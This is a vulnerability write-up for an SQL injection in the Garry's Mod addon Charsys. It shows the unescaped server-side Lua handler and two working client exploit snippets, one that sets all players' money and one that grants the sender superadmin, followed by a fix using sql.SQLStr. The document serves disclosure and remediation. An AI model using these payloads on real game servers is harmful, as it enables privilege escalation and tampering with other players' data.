# Charsys SQL Injection
Found by OverlordAkise on 2021.04.29  
Addon can be downloaded at [https://github.com/SxlaxsDev/charsystem](https://github.com/SxlaxsDev/charsystem)  

Charsys has a SQL Injection in the CharSystemCreateProfile net.Receive function.

### TL;DR
Charsys never sanitizes player input before inserting into the database.  
This allows players to use an SQL Injection on the `CharSystemCreateProfile` network channel via a malformed `name` variable from `net.ReadString`.  

### The Code
This is the unformatted Code that is responsible for the SQL Injection.
```LUA 
net.Receive("CharSystemCreateProfile", function(len,ply)
if(!ply:IsValid()) then
  return
end

if(ply.IsCreatingProfile) then  -- is the player already creating a char?
  DarkRP.notify(ply,1,4,CharSystem.Config.AlreadyCreating)
  return
end

ply.IsCreatingProfile = true  -- set variable that he is creating a char on true

local SlotNumber = net.ReadUInt(8)  -- On which slot should a char be created
local name = net.ReadString()  -- Which name?
local MaxSlots = CharSystem.Config.MaxChars[ply:GetUserGroup()] or CharSystem.Config.DefaultChars -- Which limit does the usergroup has, if it does not have one, set it to default

 -- No ints bigger than 3 or less than 1

if(MaxSlots < SlotNumber) then
  DarkRP.notify(ply,1,4,CharSystem.Config.TooHighSlot)
  return

end

SlotNumber = math.Clamp(SlotNumber,1,3)

local SlotTable = sql.Query("SELECT slot FROM charsys WHERE steamid = '"..ply:SteamID().."'")   -- gets all the chars/slots of the player

local Slot1 = SlotTable and SlotTable[1] and SlotTable[1].slot and tonumber(SlotTable[1].slot) == SlotNumber  -- Is the char on the first index the char with the same slot on which we should create a chat?
local Slot2 = SlotTable and SlotTable[2] and SlotTable[2].slot and tonumber(SlotTable[2].slot) == SlotNumber   -- So this does mean if there is already a char with this slot so is the slot already used?
local Slot3 = SlotTable and SlotTable[3] and SlotTable[3].slot and tonumber(SlotTable[3].slot) == SlotNumber

if(!SlotTable or !Slot1 and !Slot2 and !Slot3) then  -- if the slot is not used

  local NameTable = sql.Query("SELECT name FROM charsys WHERE name = '"..name.."'")  -- Does the Name already exist?
  if(NameTable) then
    DarkRP.notify(ply,1,4,CharSystem.Config.NameAlreadyExists)

    return
  end
if(CharSystem.Config.CloneID) then
  local CloneIDNumber = math.random(1,9)*1000 + math.random(1,9)*100 + math.random(1,9)*10 + math.random(1,9)
   sql.Query("INSERT INTO charsys (slot, steamid, name, money, job, cloneid) VALUES ("..SlotNumber..", '"..ply:SteamID().."', '"..name.."', "..CharSystem.Config.DefaultMoney..", '"..CharSystem.Config.DefaultTeam.."',"..CloneIDNumber..")")
  else
  sql.Query("INSERT INTO charsys (slot, steamid, name, money, job, cloneid) VALUES ("..SlotNumber..", '"..ply:SteamID().."', '"..name.."', "..CharSystem.Config.DefaultMoney..", '"..CharSystem.Config.DefaultTeam.."',0 )")
end
  ply.IsCreatingProfile = nil  -- the player does not create a profile anymore
  DarkRP.notify(ply,0,4,CharSystem.Config.CharCreated)
    -- update profile


end

ply.IsCreatingProfile = nil
CharSystemDB.SendProfiles(ply)

end)

```

### The Problem
The addon is very badly written in general.  
The Client UI checks against special characters in a characters name, but the server doesn't. This means you can send a malformed playername to the server and it will be directly inserted into the database with no escaping of special characters.  

The easiest way to do this is via the `CharSystemCreateProfile` network channel. The name, which is a `net.ReadString` from the player, get's inserted twice into the database during the receiving function.  
```LUA
local NameTable = sql.Query("SELECT name FROM charsys WHERE name = '"..name.."'")
```  
Summary: The creator of the addon doesn't escape the player input correctly.

### Example Code
The following example sets the money of every player to 999999 when creating a new character, which proves the point of this exploit:
```LUA
net.Start("CharSystemCreateProfile")
  net.WriteUInt(1, 8)
  net.WriteString("Peter Hustensaft'; UPDATE charsys SET money = 999999999;--")
net.SendToServer()
```  
Another variant would be to give oneself elevated privileges aka. superadmin:
```LUA
net.Start("CharSystemCreateProfile")
  net.WriteUInt(1, 8)
  net.WriteString("Peter Hustensaft'; INSERT INTO FAdmin_PlayerGroup(steamid, groupname) VALUES(\""..LocalPlayer():SteamID().."\",\"superadmin\");--")
net.SendToServer()
```  
Warning: You have to rejoin to get the superadmin rank.



### Fixing the exploit
The easiest fix, besides rewriting the whole addon, would be: Correctly escape player input.  
Instead of `'"..name.."'` the database code should be `"..sql.SQLStr(name).."`. This would make SQL Injections impossible.  
This would make this
```LUA
local NameTable = sql.Query("SELECT name FROM charsys WHERE name = '"..name.."'")
```  
to this
```LUA
local NameTable = sql.Query("SELECT name FROM charsys WHERE name = "..sql.SQLStr(name).."")
```  
and now the exploit should be fixed.  
(The addon probably has a lot more places where exploits could happen, this document doesn't go over all of these occurances)